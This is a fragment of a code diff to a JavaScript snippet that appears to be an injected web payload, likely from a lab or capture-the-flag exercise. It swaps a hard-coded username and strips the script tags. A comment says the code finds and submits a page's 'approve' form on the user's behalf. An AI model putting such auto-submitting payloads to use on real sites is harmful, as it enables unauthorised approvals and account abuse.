@@ -1,7 +1,6 @@
-<script>
 (async ()=>{
   try {
-    const my = "test1"; // change if your username is different
+    const my = "randomuser1"; // change if your username is different
     // 1) Try to find a visible approve <form> in the DOM and submit it
     try {
       let done=false;
@@ -50,4 +49,3 @@
     } catch(e){}
   } catch(e){}
 })();
-</script>
